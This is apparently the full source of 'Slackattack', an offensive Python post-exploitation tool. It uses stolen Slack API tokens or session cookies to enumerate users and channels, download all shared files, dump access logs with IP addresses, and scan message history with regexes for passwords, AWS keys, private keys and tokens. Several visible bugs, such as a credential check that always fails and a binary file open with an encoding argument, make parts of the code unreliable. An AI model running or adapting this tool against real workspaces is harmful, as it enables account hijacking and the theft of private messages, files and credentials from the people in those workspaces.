#!/usr/bin/python3
import argparse
import requests
import os
from datetime import datetime, timezone
import hashlib
import re
import uuid
import urllib3
from termcolor import colored
import json
from colorama import Style, init

from slackattack._version import __version__

verbose = False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

unique_hashes = set()


ALREADY_SIGNED_IN_TEAM_REGEX = r"([a-zA-Z0-9\-]+\.slack\.com)"
SLACK_API_TOKEN_REGEX = r"(xox[a-zA-Z]-[a-zA-Z0-9-]+)"
WORKSPACE_VALID_EMAILS_REGEX = r"email-domains-formatted=\"(@.+?)[\"]"
PRIVATE_KEYS_REGEX = r"([-]+BEGIN [^\s]+ PRIVATE KEY[-]+[\s]*[^-]*[-]+END [^\s]+ PRIVATE KEY[-]+)"
S3_REGEX = (
    r"[a-zA-Z0-9-\.\_]+\.s3\.amazonaws\.com"
    r"|s3://[a-zA-Z0-9-\.\_]+"
    r"|s3-[a-zA-Z0-9-\.\_\/]+"
    r"|s3.amazonaws.com/[a-zA-Z0-9-\.\_]+"
    r"|s3.console.aws.amazon.com/s3/buckets/[a-zA-Z0-9-\.\_]+"
)

CREDENTIALS_REGEX = (
    r"(?i)(password\s*[=:\"]+\s*[^\s]+|password is\s*[=:\"]*\s*[^\s]+|pwd\s*[=:\"]*\s*[^\s]+"
    r"|passwd\s*[=:\"]+\s*[^\s]+)"
)

AWS_KEYS_REGEX = (
    r"(?!com/archives/[A-Z0-9]{9}/p[0-9]{16})"
    r"((?<![A-Za-z0-9/+])[A-Za-z0-9/+]{40}(?![A-Za-z0-9/+])|(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9]))"
)

S3_QUERIES = "|".join(["s3.amazonaws.com", "s3://", "https://s3", "http://s3"])
CREDENTIALS_QUERIES = "|".join(["password:", "password is", "pwd", "passwd"])
AWS_KEYS_QUERIES = "|".join(["ASIA*", "AKIA*"])
PRIVATE_KEYS_QUERIES = "|".join(["BEGIN DSA PRIVATE",
                        "BEGIN EC PRIVATE",
                        "BEGIN OPENSSH PRIVATE",
                        "BEGIN PGP PRIVATE",
                        "BEGIN RSA PRIVATE"])
INTERESTING_FILE_QUERIES = "|".join([".config",
                            ".doc",
                            ".docx",
                            "id_rsa",
                            ".key",
                            ".p12",
                            ".pem",
                            ".pfx",
                            ".pkcs12",
                            ".ppk",
                            ".sh",
                            ".sql",
                            "backup",
                            "password",
                            "id_rsa",
                            "pasted image",
                            "secret"])
LINKS_QUERIES = "|".join(["amazonaws",
                 "atlassian",
                 "beta",
                 "confluence",
                 "docs.google.com",
                 "github",
                 "internal",
                 "jenkins",
                 "jira",
                 "kubernetes",
                 "sharepoint",
                 "staging",
                 "swagger",
                 "travis",
                 "trello"])

def make_cookie_request(workspace_url, user_cookie, proxy=None, verify_ssl=False):
    """
    Sends a GET request using a user-supplied cookie to authenticate the user.

    Args:
        workspace_url (str): Slack workspace URL.
        user_cookie (str): The user cookie for authentication.
        proxy (str): Optional proxy URL.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        str: User session token if found, otherwise None.
    """

    try:
        # remove extra 'd='  from cookie
        user_cookie = re.sub(r'^d=', '', user_cookie)

        response = requests.get(workspace_url, cookies={'d': user_cookie}, proxies={'http': proxy, 'https': proxy}, verify=verify_ssl)
        response.raise_for_status()

        # Extract user session token using regex
        user_session_token_match = re.search(r'(xox[a-zA-Z]-[a-zA-Z0-9-]+)', response.text)
        if user_session_token_match:
            return user_session_token_match.group(0)
        else:
            print("[ERROR]: User session token not found in the response.")
            return None

    except requests.exceptions.RequestException as exception:
        print(f"[ERROR]: {exception}")
        return None

def make_slack_request(url, credentials, method="POST", payload=None, proxy=None, verify_ssl=False):
    """
    Makes a Slack API request using either a token or a cookie for authentication.

    Args:
        url (str): The Slack API endpoint.
        credentials (dict): A dictionary containing authentication credentials.
        method (str): The HTTP method to use, either 'POST' or 'GET'.
        payload (str): Data to send in the request body.
        proxy (str): Optional proxy URL.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        dict: The response data as a dictionary, or None if the request fails.
    """

    headers = {}

    # Use token-based authentication if available
    if 'token' in credentials:
        headers = {"Authorization": f"Bearer {credentials['token']}"}

    # Use cookie-based authentication if token is not provided
    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(
            credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl
        )
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return None

        boundary = "----WebKitFormBoundary" + str(uuid.uuid4()).replace("-", "")
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": "https://api.slack.com",
            "Cookie": credentials['cookie'],
        }

        # Overwrite payload for cookie-based authentication
        payload = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"token\"\r\n\r\n"
            f"{user_session_token}\r\n"
            f"--{boundary}--\r\n"
        )

    try:
        # Choose POST or GET method based on input
        if method == "POST":
            response = requests.post(
                url, headers=headers, data=payload, proxies={'http': proxy, 'https': proxy},
                verify=verify_ssl
            )
        else:
            response = requests.get(
                url, headers=headers, proxies={'http': proxy, 'https': proxy},
                verify=verify_ssl
            )

        # Check if the request was successful
        response.raise_for_status()
        data = response.json()

        # Additional check to handle Slack-specific errors
        if response.status_code != 200 or not data.get("ok", False):
            print("Request failed.")
            print(f"Error message: {data.get('error', 'N/A')}")

        return data

    except requests.exceptions.RequestException as exception:
        print(f"[ERROR]: {exception}")
        return None

def test_credentials(credentials, proxy, verify_ssl=False):
    if 'token' in credentials:
        test_url = "https://slack.com/api/auth.test"
        payload = None

        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
        if response:
            print("Response:")
            print(json.dumps(response, indent=4))

    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return

        test_url = "https://slack.com/api/auth.test"
        response = make_slack_request(test_url, credentials, method="POST", payload=user_session_token, proxy=proxy, verify_ssl=verify_ssl)
        if response:
            print("Response:")
            print(json.dumps(response, indent=4))

def list_channels(credentials, proxy, verify_ssl=False):
    """
    Lists all Slack channels in the workspace.

    Args:
        credentials (dict): A dictionary containing authentication credentials.
        proxy (str): Optional proxy URL.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of channels or None if the request fails.
    """

    if 'token' in credentials:
        test_url = "https://slack.com/api/conversations.list"
        payload = None

        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
        if response:
            channels_list = response.get("channels", [])
            return channels_list
        else:
            print("Error in make_slack_request")
            return None

    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return None

        test_url = "https://slack.com/api/conversations.list"
        response = make_slack_request(test_url, credentials, method="POST", payload=user_session_token, proxy=proxy, verify_ssl=verify_ssl)
        if response:
            channels_list = response.get("channels", [])

            return channels_list
        else:
            print("Error in make_slack_request")
            return None

def list_file_urls(credentials, channel, proxy, verify_ssl=False):

    if 'token' in credentials:
        test_url = "https://slack.com/api/files.list"
        payload = None

        response_data = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return None

        test_url = "https://slack.com/api/files.list"
        response_data = make_slack_request(test_url, credentials, method="POST", payload=user_session_token, proxy=proxy, verify_ssl=verify_ssl)

    if response_data and 'files' in response_data:
        return [file_info["url_private"] for file_info in response_data["files"]]
    else:
        print("[ERROR]: Files information not found in the response.")
        return None

def list_files(credentials, proxy, verbose=False, verify_ssl=False):
    all_file_urls = []

    if 'token' in credentials:
        test_url = "https://slack.com/api/files.list"
        payload = None

        response_data = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return None

        test_url = "https://slack.com/api/files.list"
        response_data = make_slack_request(test_url, credentials, method="POST", payload=user_session_token, proxy=proxy, verify_ssl=verify_ssl)

    if response_data and 'files' in response_data:
        for file_info in response_data["files"]:
            all_file_urls.append(file_info["url_private"])
    else:
        print("[ERROR]: Files information not found in the response.")

    return all_file_urls

def download_files(credentials, file_urls, output_directory=None, proxy=None, verify_ssl=False):
    if output_directory:
        os.makedirs(output_directory, exist_ok=True)

    for url in file_urls:
        if 'token' in credentials:
            response = requests.get(url, headers={"Authorization": f"Bearer {credentials['token']}"}, stream=True, proxies={'http': proxy, 'https': proxy}, verify=verify_ssl)
        elif 'cookie' in credentials:
            response = requests.get(url, headers={"Cookie": f"{credentials['cookie']}"}, stream=True, proxies={'http': proxy, 'https': proxy}, verify=verify_ssl)

        if response.status_code == 200:
            if verbose:
                print("Response:", response.text)

            filename = generate_unique_filename(url)
            if output_directory:
                filename = os.path.join(output_directory, filename)

            with open(filename, "wb", encoding='utf-8') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            print(f"Downloaded: {filename}")
        else:
            print(f"Error downloading: {url}")

def generate_unique_filename(url):
    """
    Generates a unique filename based on the URL and current timestamp.

    Args:
        url (str): The file URL.

    Returns:
        str: The generated unique filename.
    """
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    unique_id = hashlib.md5(url.encode()).hexdigest()[:4]
    return f"{timestamp}_{unique_id}_{url.split('/')[-1]}"

def list_user_list(credentials, proxy=None, verify_ssl=False):

    if 'token' in credentials:
        test_url = "https://slack.com/api/users.list"
        payload = None

        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

        if response is not None and response.get("ok"):
            return response["members"]
        else:
            print("Error retrieving user list.")
            return []


    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return

        test_url = "https://slack.com/api/users.list"
        payload = None
        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

        if response is not None and response.get("ok"):
            return response["members"]
        else:
            print("Error retrieving user list.")
            return []

def check_user_membership(credentials, channel_id):
    if 'token' in credentials:
        url = f"https://slack.com/api/conversations.members?channel={channel_id}"
        headers = {"Authorization": f"Bearer {credentials['token']}"}
    elif 'cookie' in credentials:
        url = f"https://slack.com/api/conversations.members?channel={channel_id}"
        headers = {"Cookie": f"{credentials['cookie']}"}

    response = requests.get(url, headers=headers)
    data = response.json()
    if response.status_code == 200 and data.get("ok"):
        return True
    return False


def check_permissions(credentials, use_proxy=False, proxy_url=None, verify_ssl=False):
    proxies = None
    if use_proxy and proxy_url:
        proxies = {"http": proxy_url, "https": proxy_url}

    if 'token' in credentials:
        # perms for files.list
        files_list_url = "https://slack.com/api/files.list?limit=1"
        files_list_headers = {"Authorization": f"Bearer {credentials['token']}"}
        files_list_response = requests.get(files_list_url, headers=files_list_headers, proxies=proxies, verify=False)
        files_list_data = files_list_response.json()
        files_list_permission = "files:read" if files_list_data.get("ok") else None

        # perms for users.list
        users_list_url = "https://slack.com/api/users.list?limit=1"
        users_list_headers = {"Authorization": f"Bearer {credentials['token']}"}
        users_list_response = requests.get(users_list_url, headers=users_list_headers, proxies=proxies, verify=False)
        users_list_data = users_list_response.json()
        users_list_permission = "users:read" if users_list_data.get("ok") else None

        # perms for conversations.list
        conversations_list_url = "https://slack.com/api/conversations.list?limit=1"
        conversations_list_headers = {"Authorization": f"Bearer {credentials['token']}"}
        conversations_list_response = requests.get(conversations_list_url, headers=conversations_list_headers, proxies=proxies, verify=False)
        conversations_list_data = conversations_list_response.json()
        conversations_list_permission = "conversations:read" if conversations_list_data.get("ok") else None

        dump_logs_permission = check_dump_logs_permission(credentials['token'])

        available_flags = []

        if files_list_permission:
            #available_flags.append("--list-file-urls")
            available_flags.append("--list-files")
            available_flags.append("--download-files")


        if users_list_permission:
            available_flags.append("--list-users")

        if conversations_list_permission:
            available_flags.append("--list-channels")

        if dump_logs_permission:
            available_flags.append("--dump-logs")

        return {
            "API Token Permissions": {
                "files.list": files_list_permission,
                "users.list": users_list_permission,
                "conversations.list": conversations_list_permission,
            },
            "Available Flags": available_flags,
        }

    elif 'cookie' in credentials:
        # Get user session token
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy_url, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return None

        # Prepare URLs for API requests
        files_list_url = "https://slack.com/api/files.list"
        users_list_url = "https://slack.com/api/users.list"
        conversations_list_url = "https://slack.com/api/conversations.list"

        #  Make API requests to check permissions
        files_list_permission = list_file_urls(credentials, None, proxy_url, verify_ssl) is not None
        users_list_permission = make_slack_request(users_list_url, credentials, proxy=proxy_url, verify_ssl=verify_ssl) is not None
        conversations_list_permission = make_slack_request(conversations_list_url, credentials, proxy=proxy_url, verify_ssl=verify_ssl) is not None

        available_flags = []

        if files_list_permission:
            #available_flags.append("--list-file-urls")
            available_flags.append("--list-files")

        if users_list_permission:
            available_flags.append("--list-users")

        if conversations_list_permission:
            available_flags.append("--list-channels")

        return {
            "API Token Permissions": {
                "files.list": files_list_permission,
                "users.list": users_list_permission,
                "conversations.list": conversations_list_permission,
            },
            "Available Flags": available_flags,
        }

def check_dump_logs_permission(credentials, proxy=None, verify_ssl=False):
    if 'token' in credentials:
        url = "https://slack.com/api/team.accessLogs"
        headers = {"Authorization": f"Bearer {credentials['token']}"}
        response = make_slack_request(url, credentials, method="GET", proxy=proxy, verify_ssl=verify_ssl)

    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return False

        url = "https://slack.com/api/team.accessLogs"
        headers = {"Authorization": f"Bearer {user_session_token}"}
        response = make_slack_request(url, credentials, method="GET", proxy=proxy, verify_ssl=verify_ssl)

    else:
        #print("[ERROR]: Invalid credentials provided.")
        return False

    if isinstance(response, dict) and response.get("ok") is True:
        return True
    else:
        print("Error checking dump logs permission.")
        return False


def dump_logs(credentials, proxy=None, verify_ssl=False, verbose=False):
    if 'token' in credentials:
        url = "https://slack.com/api/team.accessLogs"
        headers = {"Authorization": f"Bearer {credentials['token']}"}
        response = make_slack_request(url, credentials, method="GET", proxy=proxy, verify_ssl=verify_ssl)


    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return

        test_url = "https://slack.com/api/team.accessLogs"
        payload = None
        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

    if isinstance(response, dict):
        data = response
    elif response:
        try:
            data = response.json()
        except json.JSONDecodeError:
            print("[ERROR]: Unable to decode JSON response.")
            print("Response:", response.text)
            return
    else:
        print("[ERROR]: No response received.")
        return

    if data and data.get("ok") and data.get("logins"):
        print("Team Access Logs:")
        for log_entry in data["logins"]:
            print(f"User ID: {log_entry['user_id']}")
            print(f"Username: {log_entry['username']}")
            print(f"Date: {unix_timestamp_to_human_readable(log_entry['date'])}")
            print(f"IP Address: {log_entry['ip']}")
            print()
    else:
        print("Error retrieving team access logs.")
        print("Response:", data)

def unix_timestamp_to_human_readable(timestamp):
    try:
        epoch_time = int(float(timestamp))  # Converts the timestamp to an int
        timestamp_in_seconds = epoch_time / 1000  # converts to seconds
        human_readable_time = datetime.fromtimestamp(timestamp_in_seconds, timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
        return human_readable_time
    except (ValueError, TypeError) as e:
        print(f"Error converting timestamp: {e}")
        return "N/A"

def pillage_conversations(credentials, proxy, verify_ssl=False):
    all_conversations = list_channels(credentials, proxy=proxy, verify_ssl=verify_ssl)

    for conversation in all_conversations:
        conversation_id = conversation['id']
        conversation_name = conversation.get('name', 'N/A')
        messages = retrieve_conversation_messages(credentials, conversation_id, proxy=proxy, verify_ssl=verify_ssl)

        for message in messages:
            channel_name = conversation_name  # Assumes channel name is the same as conversation name
            channel_id = conversation_id
            timestamp = message.get('ts', 'N/A')
            sender_info = f"User ID: {message.get('user', 'N/A')}, Username: {message.get('username', 'N/A')}"

            text = message.get('text', '')
            find_secrets_in_text(channel_name, channel_id, timestamp, sender_info, text)

def retrieve_conversation_messages(credentials, conversation_id, proxy=None, verify_ssl=False):
    """
    Retrieves messages from a Slack conversation.

    Args:
        credentials (dict): Authentication credentials (either token or cookie).
        conversation_id (str): The Slack conversation ID.
        proxy (str): Optional proxy URL.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: List of messages from the conversation.
    """
    test_url = f"https://slack.com/api/conversations.history?channel={conversation_id}"
    if 'token' in credentials:
        response = make_slack_request(test_url, credentials, method="GET", proxy=proxy, verify_ssl=verify_ssl)
    elif 'cookie' in credentials:
        user_session_token = make_cookie_request(
            credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl
        )
        if not user_session_token:
            print("[ERROR]: Unable to obtain user session token.")
            return []
        payload = {"token": user_session_token}
        response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)

    if response and response.get("ok"):
        return response.get("messages", [])
    print(f"Error retrieving messages for conversation {conversation_id}")
    return []


def find_secrets_in_text(channel_name, channel_id, timestamp, sender_info, text):
    # Hash the entire text to check for duplicates
    text_hash = hashlib.md5(text.encode()).hexdigest()

    # Check if the hash is already encountered
    if text_hash in unique_hashes:
        # print("Duplicate found. Skipping...")
        return

    # Add the hash to the set for tracking
    unique_hashes.add(text_hash)

    # regular expressions to find secrets in the text
    matches_to_highlight = [
        (re.compile(ALREADY_SIGNED_IN_TEAM_REGEX), 'cyan', 'ALREADY_SIGNED_IN_TEAM_REGEX'),
        (re.compile(SLACK_API_TOKEN_REGEX), 'magenta', 'SLACK_API_TOKEN_REGEX'),
        (re.compile(WORKSPACE_VALID_EMAILS_REGEX), 'yellow', 'WORKSPACE_VALID_EMAILS_REGEX'),
        (re.compile(PRIVATE_KEYS_REGEX), 'red', 'PRIVATE_KEYS_REGEX'),
        (re.compile(S3_REGEX), 'blue', 'S3_REGEX'),
        (re.compile(CREDENTIALS_REGEX), 'red', 'CREDENTIALS_REGEX'),
        (re.compile(AWS_KEYS_REGEX), 'red', 'AWS_KEYS_REGEX'),
        (re.compile(S3_QUERIES), 'blue', 'S3_QUERIES'),
        (re.compile(CREDENTIALS_QUERIES), 'red', 'CREDENTIALS_QUERIES'),
        (re.compile(AWS_KEYS_QUERIES), 'red', 'AWS_KEYS_QUERIES'),
        (re.compile(PRIVATE_KEYS_QUERIES), 'green', 'PRIVATE_KEYS_QUERIES'),
        #(re.compile(INTERESTING_FILE_QUERIES), 'yellow', 'INTERESTING_FILE_QUERIES'),
        #(re.compile(LINKS_QUERIES), 'cyan', 'LINKS_QUERIES'),
    ]

    details_printed = False

    results = []

    for regex, _, rule_name in matches_to_highlight:
        match = regex.search(text)
        if match:
            match_start = match.start(0)
            match_end = match.end(0)
            matched_word = text[match_start:match_end]
            message_contents = f"{text[:match_start]}{matched_word}{text[match_end:]}"
            rule_triggered = f"{rule_name}"
            channel_name = f"{channel_name}"
            channel_id = f"{channel_id}"
            timestamp_info = f"{unix_timestamp_to_human_readable(timestamp)}"
            sender_info = f"{sender_info}"
            matched_word = f"{matched_word}"

            results.append({
                "rule_triggered": rule_triggered,
                "channel_name": channel_name,
                "channel_id": channel_id,
                "timestamp": timestamp_info,
                "sender_info": sender_info,
                "matched_word": matched_word,
                "message_contents": message_contents
            })

    if results:
        print(json.dumps(results, indent=2))

def save_output_to_json(data, filename):
    """
    Saves the output data to a JSON file.

    Args:
        data (dict): The data to be saved.
        filename (str): The file name for the output JSON file.
    """
    with open(filename, 'w', encoding='utf-8') as json_file:
        json.dump(data, json_file, indent=2)

class ExamplesAction(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        examples = """
        Examples of usage:

        Using a Slack API token:
            python slackattack.py --token xoxb-1234567890 --list-users
            python slackattack.py --token xoxb-1234567890 --list-channels
            python slackattack.py --token xoxb-1234567890 --test
            python slackattack.py --token xoxb-1234567890 --check-permissions
            python slackattack.py --token xoxb-1234567890 --pillage

        Using a user-supplied cookie:
            python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --list-users
            python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --list-channels
            python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --test
            python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --check-permissions
            python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --pillage
        """
        print(examples)
        parser.exit()

class CustomHelpFormatter(argparse.HelpFormatter):
    def format_help(self):
        # Print the banner
        print_banner()
        # Return the formatted help text
        return super().format_help()

# Initialize colorama
init(autoreset=True)

def interpolate_color(c1, c2, factor):
    """Interpolate between two colors based on the factor (0.0 to 1.0)."""
    return tuple(int(c1[i] + (c2[i] - c1[i]) * factor) for i in range(3))

def bilinear_interpolate(x, y, colors, width, height):
    """Perform bilinear interpolation for the 2D gradient."""
    # Top-left to bottom-left gradient (x-axis)
    c_top = interpolate_color(colors['top_left'], colors['top_right'], x / width)
    c_bottom = interpolate_color(colors['bottom_left'], colors['bottom_right'], x / width)

    # Interpolating between the top and bottom gradients (y-axis)
    return interpolate_color(c_bottom, c_top, y / height)

def rgb_to_ansi(r, g, b):
    """Convert RGB values to an ANSI escape code."""
    return f'\033[38;2;{r};{g};{b}m'

def colorize_text_with_2d_gradient(text, width, height, colors):
    """Apply a 2D gradient color effect to the given text."""
    colored_text = ""
    lines = text.splitlines()

    for y, line in enumerate(lines):
        for x, char in enumerate(line):
            r, g, b = bilinear_interpolate(x, y, colors, width - 1, height - 1)
            colored_text += rgb_to_ansi(r, g, b) + char
        colored_text += '\n'

    return colored_text + Style.RESET_ALL

def print_banner(silence=False):
    """
    Prints a colored banner if not silenced.

    Args:
        silence (bool): If True, the banner will not be printed.
    """
    if not silence:
        banner_text = get_main_banner()
        width = max(len(line) for line in banner_text.splitlines())
        height = len(banner_text.splitlines())
        colors = {
            'top_left': (255, 0, 0),
            'top_right': (255, 165, 0),
            'bottom_left': (173, 216, 230),
            'bottom_right': (144, 238, 144)
        }
        colored_banner = colorize_text_with_2d_gradient(banner_text, width, height, colors)
        print(colored_banner)


def get_main_banner():
    """
    Returns the main banner text.

    Returns:
        str: The banner text.
    """
    return f"""
  █████████  ████                    █████           █████████   █████   █████                     █████
 ███░░░░░███░░███                   ░░███           ███░░░░░███ ░░███   ░░███                     ░░███
░███    ░░░  ░███   ██████    ██████ ░███ █████    ░███    ░███ ███████ ███████   ██████    ██████ ░███ █████
░░█████████  ░███  ░░░░░███  ███░░███░███░░███     ░███████████░░░███░ ░░░███░   ░░░░░███  ███░░███░███░░███
 ░░░░░░░░███ ░███   ███████ ░███ ░░░ ░██████░      ░███░░░░░███  ░███    ░███     ███████ ░███ ░░░ ░██████░
 ███    ░███ ░███  ███░░███ ░███  ███░███░░███     ░███    ░███  ░███ ███░███ ██████░░███ ░███  ███░███░░███
░░█████████  █████░░████████░░██████ ████ █████    █████   █████ ░░█████ ░░█████░░████████░░██████ ████ █████
 ░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░ ░░░░ ░░░░░    ░░░░░   ░░░░░   ░░░░░   ░░░░░  ░░░░░░░░  ░░░░░░ ░░░░ ░░░░░

Slackattack v{__version__}
By: Jonathan Stines - @fr4nk3nst1ner
"""

def get_sub_banner():
    return """
Slackattack
"""

def main():
    output_data = {}
    parser = argparse.ArgumentParser(description="Post-Ex tool for Slack bot and user tokens.", formatter_class=CustomHelpFormatter)
    group = parser.add_mutually_exclusive_group(required=True)

    parser.add_argument('--version', action='version', version=f'%(prog)s {__version__}')

    group.add_argument("--token", type=str, help="Slack API token")
    group.add_argument("--cookie", type=str, help="User-supplied cookie")
    parser.add_argument("--workspace-url", type=str, help="Workspace URL for authenticating user session token")

    parser.add_argument("--pillage", action='store_true', help="Search conversations for secrets")
    parser.add_argument("--output-json", "-o", type=str, help="Save output in JSON format to the specified file")

    parser.add_argument("--test", action='store_true', help="Test Slack credentials")
    parser.add_argument("--download-files", action='store_true', help="Download files")
    parser.add_argument("--output-directory", type=str, help="Output directory for downloaded files")
    parser.add_argument("--list-users", action='store_true', help="Get list of users")
    parser.add_argument("--list-channels", action='store_true', help="Get list of channels")
    parser.add_argument("--check-permissions", action='store_true', help="Check API token permissions")
    parser.add_argument("--list-files", action='store_true', help="List all files from all channels")
    parser.add_argument("--dump-logs", action='store_true', help="Dump team access logs")
    parser.add_argument("--verbose", "-v", action='store_true', help="Enable verbose logging for troubleshooting")
    parser.add_argument("--proxy", "-p", type=str, help="Specify a proxy (e.g., http://127.0.0.1:8080)")

    parser.add_argument("--examples", action=ExamplesAction, nargs=0, help="Show usage examples")

    args = parser.parse_args()

    # Validate that --workspace-url and at least one action are provided when --cookie is used
    if args.cookie and (not args.workspace_url or not any([args.test, args.list_users, args.list_channels, args.check_permissions, args.list_files, args.download_files, args.dump_logs, args.pillage])):
        parser.error("--workspace-url and at least one action (e.g., --list-users, --list-channels, --check-permissions, etc.) must be provided when --cookie is used.")

    if args.cookie:
        args.cookie = f"d={args.cookie}"

    # Validate that at least one action is specified when --token is used and that --workspace-url is not required
    if args.token and not any([args.test, args.list_users, args.list_channels, args.check_permissions, args.list_files, args.download_files, args.dump_logs, args.pillage]):
        parser.error("At least one action (e.g., --list-users, --list-channels, --check-permissions, etc.) must be specified when --token is used.")
    if args.token and args.workspace_url:
        parser.error("--workspace-url is not required when --token is used.")

    credentials = {}
    if args.token:
        credentials['token'] = args.token
    elif args.cookie:
        credentials['cookie'] = args.cookie
        credentials['workspace_url'] = args.workspace_url

    if args.proxy:
        proxy = args.proxy
    else:
        proxy = None

    # Validate credentials before proceeding
    if args.test or args.list_channels or args.list_users or args.check_permissions or args.list_files or args.download_files or args.dump_logs or args.pillage:
        if args.token:
            if not test_credentials(credentials, proxy):
                print("[ERROR]: Invalid Slack API token.")
                return
        elif args.cookie:
            if not make_cookie_request(args.workspace_url, args.cookie, proxy):
                print("[ERROR]: Invalid Slack user cookie or workspace URL.")
                return

    if args.test:
        test_credentials(credentials, proxy)

    elif args.list_channels:
        channel_list = list_channels(credentials, proxy)
        if channel_list is None:
            print("[ERROR]: Unable to retrieve channels. Invalid Slack API token or cookie.")
            return

        output_data = {"Channels": []}

        for channel in channel_list:
            is_member = check_user_membership(credentials, channel['id'])
            channel_info = {
                "Name": channel['name'],
                "ID": channel['id'],
                "Value": channel.get('value', 'N/A'),
                "Last Updated": unix_timestamp_to_human_readable(channel.get('updated', 0)),
                "Context Team ID": channel.get('context_team_id', 'N/A'),
                "Creator": channel.get('creator', 'N/A'),
                "Is Supplied Token Member": 'Yes' if is_member else 'No',
            }
            output_data["Channels"].append(channel_info)

        if args.output_json:
            save_output_to_json(output_data, args.output_json)
        else:
            print(json.dumps(output_data, indent=2))

    elif args.list_files:
        all_file_urls = list_files(credentials, proxy)
        if all_file_urls is None:
            print("[ERROR]: Unable to list files. Invalid Slack API token or cookie.")
            return

        print("List of All File URLs:")
        for file_url in all_file_urls:
            print(file_url)

        if args.output_json:
            save_output_to_json(output_data, args.output_json)
        else:
            print(json.dumps(output_data, indent=2))

    elif args.download_files:
        channel_list = list_channels(credentials, proxy=proxy)
        if channel_list is None:
            print("[ERROR]: Unable to retrieve channels for file download. Invalid Slack API token or cookie.")
            return

        all_file_urls = []
        for channel in channel_list:
            file_urls = list_file_urls(credentials, channel['id'], proxy=proxy)
            if file_urls:
                all_file_urls.extend(file_urls)
        download_files(credentials, all_file_urls, args.output_directory, proxy=proxy)

    elif args.list_users:
        user_list = list_user_list(credentials, proxy=proxy)
        if user_list is None:
            print("[ERROR]: Unable to retrieve users. Invalid Slack API token or cookie.")
            return

        output_data = {"Users": []}
        for user in user_list:
            user_info = {
                "User ID": user['id'],
                "Username": user['name'],
                "Real Name": user['profile'].get('real_name'),
                "Display Name": user['profile'].get('display_name_normalized', 'N/A'),
                "Email": user['profile'].get('email', 'N/A'),
                "Is Admin": "Yes" if user.get('is_admin', False) else "No",
                "Is Owner": "Yes" if user.get('is_owner', False) else "No",
                "Is Primary Owner": "Yes" if user.get('is_primary_owner', False) else "No",
            }
            output_data["Users"].append(user_info)

        if args.output_json:
            save_output_to_json(output_data, args.output_json)
        else:
            print(json.dumps(output_data, indent=2))

    elif args.check_permissions:
        permissions = check_permissions(credentials, use_proxy=True, proxy_url=proxy)
        if permissions is None:
            print("[ERROR]: Unable to check permissions. Invalid Slack API token or cookie.")
            return

        print("API Token Permissions:")
        for endpoint, permission in permissions['API Token Permissions'].items():
            print(f"{endpoint}: {permission}")

        print("\nAvailable Flags:")
        for flag in permissions['Available Flags']:
            print(flag)

        if args.output_json:
            save_output_to_json(output_data, args.output_json)
        else:
            print(json.dumps(output_data, indent=2))

    elif args.dump_logs:
        if not dump_logs(credentials, proxy):
            print("[ERROR]: Unable to dump logs. Invalid Slack API token or cookie.")
            return

    if args.pillage:
        output_data = pillage_conversations(credentials, proxy=proxy)
